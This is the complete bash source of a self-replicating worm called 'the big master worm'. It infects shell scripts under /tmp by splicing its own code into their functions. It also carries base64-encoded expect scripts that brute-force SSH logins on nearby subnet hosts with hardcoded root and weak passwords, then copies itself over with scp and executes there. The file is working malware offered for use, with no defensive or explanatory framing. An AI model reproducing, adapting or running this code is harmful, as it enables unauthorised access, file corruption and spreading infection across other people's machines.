#!/bin/bash
#
# bmw - the big master worm
#
# v320  by wzt	2019
#

# bmw_phase1_start
infect_dir="/tmp"
infect_size=10
infect_line=4
infect_max_num=4
infect_num=0
infect_func_num=2
infect_self_num=5
infect_self_name=""
infect_key_words="the big master worm."

bmw_find_scripts()
{
	local file file_sz func_num

	for file in `find $infect_dir -name "*.sh"`
	do
		[ $infect_num -gt $infect_max_num ] && break

		file_sz=`wc -c $file |awk '{print $1}'`
		file_line=`wc -l $file |awk '{print $1}'`

		[[ $file_sz -lt $infect_size || $file_line -lt $infect_line ]] && continue 

		func_num=`grep '^[a-zA-Z0-9_][^"]*()' $file|wc -l`
		[ $func_num -lt $infect_func_num ] && continue

		if grep "$infect_key_words" $file >/dev/null; then
			echo "$file has been infected."
			continue
		fi
		echo "<$file_sz $file_line $func_num> infecting $file..."
		bmw_infect_file $1 $file $func_num
		((infect_num++))
	done
}
# bmw_phase1_end

# bmw_phase2_start
bmw_infect_file()
{
	local rand_num i j k l
	local phase_s phase_e

	rand_num=$((RANDOM%$3))
	if [ $rand_num -eq 0 ]; then
		rand_num=1
	fi

	echo "$3 => $rand_num $2"

	phase_s="bmw_phase1_start"
	phase_e="bmw_phase$infect_self_num""_end"

	bmw_extract_body "$1" "$phase_s" "$phase_e" "$2" $rand_num
}

bmw_extract_body()
{
	local shellcode newcode

        shellcode=`awk -v phase_start="$2" -v phase_end="$3" 'BEGIN {phase_flag=0;phase_len=0}{if (phase_flag == 1) {phase_array[phase_len]=$0;phase_len++}if ($0 ~ phase_start) {phase_flag=1;phase_array[phase_len]=$0;phase_len++}if ($0 ~ phase_end) {phase_flag=0;}}END {for (i = 0; i < phase_len; i++) print phase_array[i]}' $1`

	shellcode1=$(echo "$shellcode"|sed 's/\\/\\\\/g')
	newcode=`awk -v scode="$shellcode1" -v tnum="$5" 'BEGIN {func_flag=0;func_num=0}{if (func_flag == 1) {print $0;	if ($0 ~ /^\}/) {func_flag=0;print scode}}else {if ($0 ~ /^[[:alnum:]].*\(\)/) {func_num++;if (func_num == tnum) {func_flag=1;}}print $0}}' $4`

	echo -e "$newcode"|sed 's/\\/\\\\/g' >$4.bak
	rm -f $4 && mv $4.bak $4
	chmod +x $4
}
# bmw_phase2_end

scp_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDJdCnNldCBVU0VSIFtsaW5k
ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDVdCnNldCBMT0NBTF9GSUxFIFts
aW5kZXggJGFyZ3YgMF0Kc2V0IFRJTUVPVVQgW2xpbmRleCAkYXJndiA0XQpzZXQgdGltZW91dCBb
bGluZGV4ICRhcmd2IDRdCnNldCBSRU1PVEVfUEFUSCBbbGluZGV4ICRhcmd2IDNdCgpzcGF3biBz
Y3AgLW8gU2VydmVyQWxpdmVJbnRlcnZhbD0kVElNRU9VVCAtbyBDb25uZWN0VGltZW91dD0kVElN
RU9VVCAgJExPQ0FMX0ZJTEUgJFVTRVJAJElQOiRSRU1PVEVfUEFUSApleHBlY3QgewoJIih5ZXMv
bm8pIiB7IHNlbmQgInllc1xyIjsgZXhwX2NvbnRpbnVlIH0KCSIqYXNzd29yZDoiIHsgc2VuZCAi
JFBBU1NXRFxyIiB9CgkiUGFzc3dvcmQgZm9yIiB7IHNlbmQgIiRQQVNTV0RcciIgfQoJIk5hbWUg
b3Igc2VydmljZSBub3Qga25vd24iIHsgZXhpdCAxfQoJIk5vIHJvdXRlIHRvIGhvc3QiIHsgZXhp
dCAyIH0KCSJDb25uZWN0aW9uIHJlZnVzZWQiIHsgZXhpdCA5IH0KCSJMYXN0IGxvZ2luOiIgeyBl
eGl0IDN9Cgl0aW1lb3V0IHsgZXhpdCA0IH0KCWVvZiB7IGV4aXQgMCB9Cn0KCmV4cGVjdCB7CiAg
ICAgICAgIiphc3N3b3JkOiIgeyBleGl0IDUgfQoJIlBhc3N3b3JkIGZvciIgeyBleGl0IDggfQog
ICAgICAgIGVvZiB7IGV4aXQgMCB9Cn0K"

ssh_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDBdCnNldCBVU0VSIFtsaW5k
ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDJdCnNldCBDTUQgW2xpbmRleCAk
YXJndiAzXQpzZXQgVElNRU9VVCBbbGluZGV4ICRhcmd2IDRdCnNldCB0aW1lb3V0IFtsaW5kZXgg
JGFyZ3YgNF0KCnNwYXduIC1ub2VjaG8gc3NoIC1vIFNlcnZlckFsaXZlSW50ZXJ2YWw9JFRJTUVP
VVQgLW8gQ29ubmVjdFRpbWVvdXQ9JFRJTUVPVVQgLXQgJFVTRVJAJElQICRDTUQKZXhwZWN0IHsK
CSIoeWVzL25vKSIgeyBzZW5kICJ5ZXNcciI7IGV4cF9jb250aW51ZSB9CgkiKmFzc3dvcmQ6IiB7
IHNlbmQgIiRQQVNTV0RcciIgfQoJIlBhc3N3b3JkIGZvciIgeyBzZW5kICIkUEFTU1dEXHIiIH0K
CSJOYW1lIG9yIHNlcnZpY2Ugbm90IGtub3duIiB7IGV4aXQgMX0KCSJObyByb3V0ZSB0byBob3N0
IiB7IGV4aXQgMiB9CgkiQ29ubmVjdGlvbiByZWZ1c2VkIiB7IGV4aXQgOSB9CgkiQ29ubmVjdGlv
biByZXNldCBieSBwZWVyIiB7ZXhpdCA5fQoJdGltZW91dCB7IGV4aXQgNCB9Cgllb2YgeyBleGl0
IDEwIH0KfQoKZXhwZWN0IHsKICAgICAgICAiKmFzc3dvcmQ6IiB7IGV4aXQgNSB9CgkiUGFzc3dv
cmQgZm9yIiB7IGV4aXQgOCB9CiAgICAgICAgInVpZD0iIHsgZXhpdCAxMDAgfQoJIipdJCIgeyBl
eGl0IDEwMCB9CgkiKl0jIiB7IGV4aXQgMTAwIH0KCSIqJCIgeyBleGl0IDEwMCB9CgkiKiMiIHsg
ZXhpdCAxMDAgfQoJIkxhc3QgbG9naW46IiB7IGV4aXQgMTAwIH0KICAgICAgICBlb2YgeyBleGl0
IDcgfQp9Cg=="

ssh_crack_user=("root" "wzt")
ssh_crack_passwd=("123456" "111" "giveshell" "afafa" "afafdfafdf")

bmw_ssh_copy_file()
{
	./scp_crack.exp $2 $user $1 "/tmp" 4 $passwd
	[ $? -ne 0 ] && return
	./ssh_crack.exp $1 $user $passwd "cd /tmp;$2" 4
}

bmw_ssh_crack()
{
	local user passwd ret

	for user in ${ssh_crack_user[*]}
	do
		for passwd in ${ssh_crack_passwd[*]}
		do
			./ssh_crack.exp $1 $user $passwd "" 4
			ret=$?
			echo -e "\nretcode: $ret\n"
			if [ $ret -eq 100 ]; then
				echo -ne "\ttrying $user => $passwd\t[success]\n"
				bmw_ssh_copy_file $1 $2 $user $passwd
				return 
			elif [ $ret -eq 9 ]; then
				break;
			else
				echo -ne "\ttrying $user => $passwd\t[failed]\r"
			fi
		done
	done
}

bmw_crack_init()
{
	local bin old_ifs flag=0

	old_ifs=$IFS; IFS=':'
	for bin in $PATH
	do
		[ -f $bin/expect ] && flag=1
	done
	IFS=$old_ifs

	[ $flag -ne 1 ] && return 1

	echo "$ssh_crack_exp"|base64 -d >ssh_crack.exp
	[ -f ssh_crack.exp ] && chmod +x ssh_crack.exp

	echo "$scp_crack_exp"|base64 -d >scp_crack.exp
	[ -f scp_crack.exp ] && chmod +x scp_crack.exp
	return 0
}

bmw_infect_net()
{
	local local_ip host ip

	local_ip=`env|grep -i SSH_CONNECTION|awk '{print $3}'`
	host=`echo $local_ip|cut -d '.' -f 1-3`

	bmw_crack_init
	[ $? -eq 1 ] && return 1

	for ((i = 136; i <= 138; i++))
	do
		ip="$host.$i"
		echo -e "ping $ip"

		[ "$local_ip" == "$ip" ] && continue

		ping -W 1 -c 1 $ip >/dev/null
		[ $? -eq 1 ] && continue

		exec 254<> /dev/tcp/$ip/22
		[ $? -ne 0 ] && continue
		echo "$ip port 22 is open."
		exec 254<&-; exec 254>&- 

		bmw_ssh_crack "$ip" $1
	done

}

# bmw_phase5_start
#bmw_find_scripts $0
bmw_infect_net $0
# bmw_phase5_end
